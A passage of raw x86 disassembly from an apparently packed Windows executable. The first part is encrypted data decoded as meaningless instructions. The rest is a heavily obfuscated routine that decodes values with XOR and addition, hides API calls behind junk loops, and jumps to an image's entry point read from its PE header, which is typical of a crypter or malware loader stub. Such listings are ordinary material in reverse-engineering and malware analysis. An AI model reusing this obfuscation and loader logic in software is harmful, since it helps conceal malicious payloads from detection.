  40d613:	xor    DWORD PTR [eax+0x5a],esp
  40d616:	imul   edx,DWORD PTR [edi-0x6bc2a2aa],0x1f
  40d61d:	adc    eax,0xc76738d7
  40d622:	inc    ebx
  40d623:	cld    
  40d624:	data16 cmp dl,BYTE PTR [edi+0x24]
  40d628:	mov    ebx,0xf85a236d
  40d62d:	jns    0x40d674
  40d62f:	jmp    0xf7c0:0x9af286c7
  40d636:	ds call 0x7b08a133
  40d63c:	pop    ss
  40d63d:	or     BYTE PTR [esi+0x3],dh
  40d640:	int    0x4c
  40d642:	out    dx,al
  40d643:	xchg   ebp,eax
  40d644:	xor    eax,0x9e937e4f
  40d649:	test   al,0x83
  40d64b:	jno    0x40d68d
  40d64d:	test   eax,0xaf711d61
  40d652:	lods   al,BYTE PTR ds:[esi]
  40d653:	push   ebx
  40d654:	in     eax,0x99
  40d656:	mov    esi,0x1479e457
  40d65b:	adc    al,0xdd
  40d65d:	hlt    
  40d65e:	dec    eax
  40d65f:	and    al,0xba
  40d661:	mov    dh,BYTE PTR [esi+eax*4]
  40d664:	cmp    esp,DWORD PTR [edx+0x52c412d0]
  40d66a:	mov    edi,0x235f8c4d
  40d66f:	stc    
  40d670:	sub    BYTE PTR [ebp-0x35],dl
  40d673:	mov    bh,0x61
  40d675:	ins    DWORD PTR es:[edi],dx
  40d676:	ret    
  40d677:	inc    ebx
  40d678:	xchg   esp,eax
  40d679:	in     al,dx
  40d67a:	in     eax,dx
  40d67b:	add    ah,dh
  40d67d:	jns    0x40d639
  40d67f:	pop    ss
  40d680:	in     al,dx
  40d681:	sbb    eax,0xb99ca454
  40d686:	(bad)  
  40d687:	aad    0x7
  40d689:	addr16 xchg edx,eax
  40d68b:	retf   
  40d68c:	adc    cl,BYTE PTR [ecx+0x20]
  40d68f:	into   
  40d690:	out    0x82,eax
  40d692:	add    eax,0x25d9603
  40d697:	cmp    eax,0xb07d7c7d
  40d69c:	inc    ecx
  40d69d:	mov    dh,0x38
  40d69f:	xor    edx,ecx
  40d6a1:	jnp    0x40d675
  40d6a3:	jp     0x40d6f1
  40d6a5:	jnp    0x40d645
  40d6a7:	jge    0x40d63e
  40d6a9:	mov    ebx,DWORD PTR [edx]
  40d6ab:	dec    ecx
  40d6ac:	fwait
  40d6ad:	xchg   esi,eax
  40d6ae:	lods   al,BYTE PTR ds:[esi]
  40d6af:	and    al,BYTE PTR [edi-0x21342cea]
  40d6b5:	nop
  40d6b6:	pop    ebx
  40d6b7:	xchg   ebp,eax
  40d6b8:	out    0x87,eax
  40d6ba:	adc    eax,0xe3114ae5
  40d6bf:	test   DWORD PTR [edx+0x27],ebx
  40d6c2:	cli    
  40d6c3:	adc    eax,DWORD PTR [edi]
  40d6c5:	or     BYTE PTR [ebx-0x76946e32],bl
  40d6cb:	sbb    al,0x12
  40d6cd:	mov    ebx,DWORD PTR [esi+0x1e]
  40d6d0:	pop    ss
  40d6d1:	xchg   ebp,eax
  40d6d2:	mov    WORD PTR [ebx],gs
  40d6d4:	mov    dh,0xf
  40d6d6:	jb     0x40d70b
  40d6d8:	mov    bh,0x5e
  40d6da:	pop    eax
  40d6db:	popf   
  40d6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6dd:	mov    BYTE PTR [edx+ebp*8],0x9c
  40d6e1:	cwde   
  40d6e2:	rcl    ch,cl
  40d6e4:	adc    ebx,DWORD PTR [ecx-0x2d]
  40d6e7:	push   edi
  40d6e8:	sbb    BYTE PTR [edx-0x7028b9f7],dh
  40d6ee:	sub    al,0x52
  40d6f0:	jbe    0x40d6e6
  40d6f2:	cmp    al,0xad
  40d6f4:	xor    al,0xad
  40d6f6:	sti    
  40d6f7:	or     dl,BYTE PTR [edx]
  40d6f9:	jmp    0x40d74b
  40d6fb:	loope  0x40d6a8
  40d6fd:	jae    0x40d779
  40d6ff:	mov    ebx,DWORD PTR [edi+eiz*1+0x3129a708]
  40d706:	stc    
  40d707:	sub    bl,bl
  40d709:	mov    bl,0x84
  40d70b:	leave  
  40d70c:	ret    
  40d70d:	or     edi,DWORD PTR [ebp-0xc99fc17]
  40d713:	repz leave 
  40d715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d716:	mov    eax,ds:0x9f4cd95f
  40d71b:	or     BYTE PTR [eax-0x33],bh
  40d71e:	sub    DWORD PTR [edi+0x70d3a91e],eax
  40d724:	or     esi,DWORD PTR [eax-0x45]
  40d727:	daa    
  40d728:	push   esp
  40d729:	daa    
  40d72a:	cmp    esi,esi
  40d72c:	imul   esi,DWORD PTR [ecx+ebx*2-0x36],0x4a591ea
  40d734:	jae    0x40d7a4
  40d736:	mul    DWORD PTR [edx+0x50b79cde]
  40d73c:	inc    edi
  40d73d:	push   esp
  40d73e:	daa    
  40d73f:	imul   ebp,DWORD PTR [ecx-0x579ff794],0x6
  40d746:	sti    
  40d747:	fimul  DWORD PTR [ecx-0x5ef95636]
  40d74d:	ss jae 0x40d6d7
  40d750:	pop    ebp
  40d751:	shl    DWORD PTR [ebx-0x47b7dd5f],1
  40d757:	mov    bh,0x8b
  40d759:	icebp  
  40d75a:	imul   ecx,esp,0xffffff89
  40d75d:	xchg   edx,eax
  40d75e:	fwait
  40d75f:	hlt    
  40d760:	in     al,0x68
  40d762:	or     eax,0x831a64c5
  40d767:	cwde   
  40d768:	es inc ebx
  40d76a:	outs   dx,DWORD PTR ds:[esi]
  40d76b:	rol    BYTE PTR [ecx+0x48],0xd8
  40d76f:	jmp    0xcb4dfa67
  40d774:	les    esp,FWORD PTR [edi]
  40d776:	retf   
  40d777:	in     eax,0x79
  40d779:	jnp    0x40d7b2
  40d77b:	push   edi
  40d77c:	les    esp,FWORD PTR [ebp+0x56a561db]
  40d782:	mov    edx,0x141f5c17
  40d787:	lock adc eax,0xa3923c2e
  40d78d:	mov    al,ds:0xa6705a1a
  40d792:	test   DWORD PTR [edi+0x285d6e0d],0xca06bf02
  40d79c:	in     eax,dx
  40d79d:	(bad)  
  40d79e:	retf   
  40d79f:	or     DWORD PTR [edx-0x4034e60],ebx
  40d7a5:	mov    cl,0xab
  40d7a7:	dec    eax
  40d7a8:	mov    bh,0xdc
  40d7aa:	cld    
  40d7ab:	push   ss
  40d7ac:	dec    ebp
  40d7ad:	std    
  40d7ae:	mov    ecx,0x185da0cb
  40d7b3:	dec    ebp
  40d7b4:	mov    esp,es
  40d7b6:	pop    ss
  40d7b7:	std    
  40d7b8:	cmp    BYTE PTR [edi+0x1a056fce],al
  40d7be:	pop    ebp
  40d7bf:	clc    
  40d7c0:	dec    ecx
  40d7c1:	ss add eax,0xd2b93b5d
  40d7c7:	sbb    BYTE PTR [eax],bh
  40d7c9:	adc    BYTE PTR [ebx-0x45],al
  40d7cc:	or     al,BYTE PTR [edi-0x3d296d05]
  40d7d2:	(bad)  
  40d7d4:	cwde   
  40d7d5:	pop    ebp
  40d7d6:	out    0xc2,al
  40d7d8:	dec    ebx
  40d7d9:	test   DWORD PTR [ebx+ebx*8+0x65],eax
  40d7dd:	pop    eax
  40d7de:	xchg   edi,eax
  40d7df:	repz and DWORD PTR [ecx-0x7c],0x10
  40d7e4:	(bad)  
  40d7e5:	cmp    al,0x2e
  40d7e7:	dec    esi
  40d7e8:	push   cs
  40d7e9:	mov    esi,0x5bb514c9
  40d7ee:	retf   
  40d7ef:	pop    edi
  40d7f0:	xchg   esp,eax
  40d7f1:	je     0x40d78f
  40d7f3:	push   0x7d
  40d7f5:	jb     0x40d7dd
  40d7f7:	jbe    0x40d7e9
  40d7f9:	stc    
  40d7fa:	pusha  
  40d7fb:	or     edi,DWORD PTR [ebx-0x1b5a3fa9]
  40d801:	aad    0xd9
  40d803:	sub    eax,0x836c4f35
  40d808:	pusha  
  40d809:	xchg   ebx,eax
  40d80a:	mov    esi,0x58a17620
  40d80f:	dec    edx
  40d810:	push   esp
  40d811:	std    
  40d812:	inc    ebp
  40d813:	mov    cl,0x79
  40d815:	sub    BYTE PTR [edi+0x4c04982f],0x3a
  40d81c:	mov    edx,0x97e609dd
  40d821:	xchg   BYTE PTR [esi+eiz*2-0x5],bh
  40d825:	inc    ebp
  40d826:	sbb    bh,BYTE PTR [edx]
  40d828:	test   al,0x73
  40d82a:	repz rol BYTE PTR [eax-0x58],0xcd
  40d82f:	mov    edx,0x1377c94b
  40d834:	or     BYTE PTR [edi],0x42
  40d837:	cli    
  40d838:	inc    eax
  40d839:	push   es
  40d83a:	aaa    
  40d83b:	pop    eax
  40d83c:	pop    esp
  40d83d:	ss pop esi
  40d83f:	aas    
  40d840:	and    DWORD PTR [ebx],esp
  40d842:	scas   al,BYTE PTR es:[edi]
  40d843:	int3   
  40d844:	sub    DWORD PTR [edi],edx
  40d846:	mov    ebp,0x4773b06d
  40d84b:	ror    al,cl
  40d84d:	mov    WORD PTR [ebx+0x2fdab642],ss
  40d853:	cmc    
  40d854:	in     eax,dx
  40d855:	dec    esp
  40d856:	xchg   BYTE PTR [edx],dl
  40d858:	fdiv   st(5),st
  40d85a:	(bad)  
  40d85b:	adc    eax,DWORD PTR [esi]
  40d85d:	scas   eax,DWORD PTR es:[edi]
  40d85e:	mov    BYTE PTR [ecx-0x4c6ad0c9],dl
  40d864:	pop    es
  40d865:	pop    eax
  40d866:	jb     0x40d806
  40d868:	mov    bh,dl
  40d86a:	add    al,0xde
  40d86c:	(bad)  
  40d86e:	sub    eax,esi
  40d870:	jp     0x40d88a
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fde9,0x42e21c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fe76,0x42fdf1
  40d8af:	call   DWORD PTR ds:0x42e597
  40d8b5:	and    DWORD PTR ds:0x42fdfd,0x42fe82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e234,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e224,0x42fde9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e60f
  40d8ee:	sbb    DWORD PTR ds:0x42e7fb,0x42fe72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fdf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e557
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fe05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fe76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e224,0x42e7f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fe6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fded,0x42e218
  40d977:	call   DWORD PTR ds:0x42e59f
  40d97d:	mov    DWORD PTR ds:0x42e21c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e48f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fe01,0x42e234
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fded,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e3fb
  40d9be:	mov    DWORD PTR ds:0x42fe8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e218,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fdf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fdf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fdf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fdf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e28d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e64f
  40da20:	cmp    DWORD PTR ds:0x42fdf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fdf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fdf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fdf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e803,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e7f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fdd1,0x42e21c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fe05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fe05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fe05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e653
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fe05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fe05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e807,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e807,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e807,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e563
  40dae4:	cmp    DWORD PTR ds:0x42e807,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e807
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e807,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e807
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e807,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e7ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e7ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e7ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e657
  40db41:	cmp    DWORD PTR ds:0x42e7ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fe76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fe76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fe76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e65b
  40db97:	cmp    DWORD PTR ds:0x42fe76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e807,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e813,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fe7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fde5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fde5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fde5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fde5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fde5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e567
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e228,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fe01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fe09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e7f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e7f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e56b
  40dcaa:	cmp    DWORD PTR ds:0x42e7f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe82,0x42e22c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe82,0x42e224
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fdd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e218,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fe72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fe72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fe72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e56f
  40dd4f:	cmp    DWORD PTR ds:0x42fe72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fe0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e230,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fe09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe86,0x42fdfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e7f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e7ff,0x42fe8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e7eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fde5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fde5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fde5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fde5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fe09
  40de0d:	push   0x42e36d
  40de12:	call   DWORD PTR ds:0x42e573
  40de18:	cmp    DWORD PTR ds:0x42fde5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fe21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fdfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fdf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fdf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fdf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e65f
  40de65:	mov    edx,DWORD PTR ds:0x42fdf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fdf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
